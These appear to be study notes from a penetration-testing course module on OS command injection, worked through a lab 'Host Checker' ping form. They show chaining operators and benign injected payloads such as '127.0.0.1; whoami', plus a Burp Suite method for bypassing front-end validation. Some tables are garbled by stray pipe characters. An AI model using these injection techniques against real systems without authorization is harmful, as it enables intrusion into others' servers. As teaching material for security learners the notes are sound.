# Detection of Command Injection

Detecting basic OS Command Injection vulnerabilities typically involves attempting direct exploitation. The idea is to tamper with the input in a way that changes the output of the system command being executed. If the application returns altered output based on our injected input, the vulnerability is confirmed.

For basic cases:

- Detection and exploitation are essentially the same process.    
- This module focuses on basic command injection where the input is unsanitized and directly passed to a system command.
### Example Scenario: Host Checker

The target web application contains a Host Checker feature that asks for an IP address to check whether the host is alive.

- Input: `127.0.0.1`    
- Output: Standard ping response
- Internally, the application likely runs:

```bash
ping -c 1 <user_input>
```

If this command is built using unsanitized input, command injection becomes possible.
## Injection Operators and Payloads

To inject a second command, we can use various shell metacharacters:

| Operator Type | Character   | URL Encoded | Execution Behavior                             |
| ------------- | ----------- | ----------- | ---------------------------------------------- |
| Semicolon     | `;`         | `%3b`       | Executes both commands                         |
| New Line      | `\n`        | `%0a`       | Executes both (some filters bypassed)          |
| Background    | `&`         | `%26`       | Executes both, second may run in background    |
| Pipe          | `           | `           | `%7c`                                          |
| Logical AND   | `&&`        | `%26%26`    | Second runs only if first succeeds             |
| Logical OR    | `           |             | `                                              |
| Sub-Shell     | `` `cmd` `` | `%60%60`    | Linux/macOS only, executes command in subshell |
| Sub-Shell     | `$(cmd)`    | `%24%28%29` | Linux/macOS only, executes command in subshell |
### Payload Construction Example

For input field:

```
127.0.0.1;id
```

This would result in:

```bash
ping -c 1 127.0.0.1;id
```

If the application executes this as-is, the `id` command output will be included in the response — confirming injection.
### Notes on Platform Differences

- Linux/macOS:    
    - All injection operators are supported.
    - Subshells (`` ` ``, `$()`) work as expected.        
- Windows (CMD):
    - `;` does not work.
    - Prefer `&&`, `||`, or `&` for chaining commands.        
- Windows PowerShell:
    - `;` is supported, but the context might differ.
### Detection Tips

- Try benign commands like `id`, `whoami`, or `uname -a`.    
- Check which commands get reflected in the output.
- Always URL-encode payloads during real exploitation or fuzzing.    
# Injecting Commands

After identifying that the Host Checker is potentially vulnerable to command injection, we proceed with testing payloads using common operators.
### Step 1: Crafting the Payload

We attempt to inject the following payload into the input field:

```
127.0.0.1; whoami
```

Expected execution on the back-end:

```bash
ping -c 1 127.0.0.1; whoami
```
### Step 2: Local Testing

Before exploiting the application, test the payload locally on your Linux terminal:

```bash
ping -c 1 127.0.0.1; whoami
```

Expected output:

```
PING 127.0.0.1...
...
21y4d
```

This confirms that both commands run sequentially due to the `;` operator.
## Application Behavior

### Front-End Validation Block

When the payload is submitted in the input form:

- A tooltip shows: "Match the requested format"
    
- No request is sent to the server (verified via browser dev tools)
    
- This indicates client-side (front-end) validation only
    

> Developers often rely on front-end validation, which is easily bypassed.

## Bypassing Front-End Validation

### Tools Required

- Burp Suite (or OWASP ZAP) as a web proxy    
- Firefox configured to route traffic through Burp
### Steps

1. Intercept a normal request (e.g., with IP `127.0.0.1`)    
2. Send to Repeater via `CTRL + R`
3. Modify the request payload with:

```
127.0.0.1; whoami
```    

4. URL-encode the payload using `CTRL + U` 
5. Send the modified request
### Example Request (Raw)

```http
POST /check HTTP/1.1
Host: vulnerable-app.htb
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

ip=127.0.0.1%3B%20whoami
```
### Response

The HTML response includes:

- Ping result of `127.0.0.1`    
- Output of `whoami`

✅ This confirms successful command injection by bypassing front-end validation.
### Key Takeaways

- Front-end validation is not security — it can always be bypassed.    
- Always check with intercepted and modified raw HTTP requests.
- Use tools like Burp Suite for manual testing and payload crafting.
# Testing Other Injection Operators

After confirming command injection using the semicolon (`;`), we test alternative shell operators to understand their behavior in different scenarios.
### Using the AND Operator (`&&`)

Payload:

```
127.0.0.1 && whoami
```

Executed Command:

```bash
ping -c 1 127.0.0.1 && whoami
```

Behavior:

- Second command (`whoami`) runs only if the first (`ping`) succeeds.    
- Ideal for clean chaining of commands when the first must be valid.
#### Local Test

```bash
ping -c 1 127.0.0.1 && whoami
```

Output:

- Ping results    
- Then current user (e.g., `21y4d`)
#### In Burp Suite

- Intercept request    
- Modify payload to:

```
127.0.0.1 && whoami
```

- URL-encode: `127.0.0.1%20%26%26%20whoami`    
- Send and confirm both outputs in the response

✅ Successful command injection using `&&`
### Using the OR Operator (`||`)

Payload:

```
127.0.0.1 || whoami
```

Executed Command:

```bash
ping -c 1 127.0.0.1 || whoami
```

Behavior:

- Second command (`whoami`) runs only if the first command fails.    
- Useful when original command is likely to break (e.g., invalid syntax or unreachable host)
#### Local Test

```bash
ping -c 1 127.0.0.1 || whoami
```

Output:

- Only ping result (no `whoami`)    
- Because ping succeeded, `whoami` is skipped

Now try an intentionally broken payload:

```
|| whoami
```

Executed Command:

```bash
ping -c 1 || whoami
```

Output:

- `ping` fails → `whoami` runs
#### In Burp Suite

- Replace payload with:

```
|| whoami
```

- URL-encode: `%7C%7C%20whoami` or `|+|+whoami`    
- Send and observe: only `whoami` output is returned

✅ Successful command injection using `||` (after triggering failure)
## Summary: Operator Behavior

| Operator | Execution Condition                        | Works On                                |
| -------- | ------------------------------------------ | --------------------------------------- |
| `;`      | Always executes both commands              | Unix, PowerShell                        |
| `&&`     | Second runs only if first succeeds | All                                     |
| `        |                                            | `                                       |
| `        | `                                          | Pipes output of first command to second |
## General Injection Operator Reference Table

| Injection Type                    | Common Operators                              |
| --------------------------------- | --------------------------------------------- |
| SQL Injection                 | `'`, `;`, `--`, `/* */`                       |
| Command Injection             | `;`, `&&`, `                                  |
| LDAP Injection                | `*`, `()`, `&`, `                             |
| XPath Injection               | `'`, `or`, `and`, `not`, `substring`, `count` |
| Code Injection                | `'`, `;`, `--`, `/* */`, `${}`, `#{}`, `^`    |
| Directory/File Path Traversal | `../`, `..\\`, `%00`                          |
| Object Injection              | `;`, `&`, `                                   |
| XQuery Injection              | `'`, `;`, `--`, `/* */`                       |
| Shellcode Injection           | `\x`, `\u`, `%u`, `%n`                        |
| Header Injection              | `\n`, `\r\n`, `\t`, `%0d`, `%0a`, `%09`       |

> ⚠️ This list is not exhaustive. Operators depend on environment and parsing context.

## Note on Advanced Injections

This module focuses on direct command injections — where input is directly passed to system commands and their output is visible.

For more complex topics:

- Indirect command injections    
- Blind command injection
- Timing-based or out-of-band techniques
